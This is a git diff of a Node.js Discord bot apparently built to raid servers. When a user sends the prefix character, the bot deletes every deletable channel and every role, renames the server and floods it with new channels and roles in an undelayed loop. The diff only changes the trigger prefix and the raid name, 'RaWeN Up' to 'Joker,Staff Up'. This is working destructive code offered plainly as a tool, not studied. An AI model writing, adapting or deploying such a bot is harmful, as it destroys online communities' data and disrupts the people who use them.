@@ -1,8 +1,8 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
-const prefix = ".";
+const prefix = "#";
 client.on("message", message => {
-  if (message.content === ".") {
+  if (message.content === "#") {
     if (message.channel.guild) {
       message.guild.channels.forEach(c => {
         if (c.deletable) {
@@ -15,11 +15,11 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("RaWeN Up");////nawek dane bo sar server 
+      message.guild.setName("Joker,Staff Up");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("RaWeN Up", "text");///////bo channel 
-        message.guild.createChannel("RaWeN Up", "voice");////bo voice
-        message.guild.createRole({ name: "RaWeN Up" });////nawek dane bo role kan
+        message.guild.createChannel("Joker,Staff Up", "text");///////bo channel 
+        message.guild.createChannel("Joker,SaffUp", "voice");////bo voice
+        message.guild.createRole({ name: "Joker,Staff Up" });////nawek dane bo role kan
       });
     }
   }
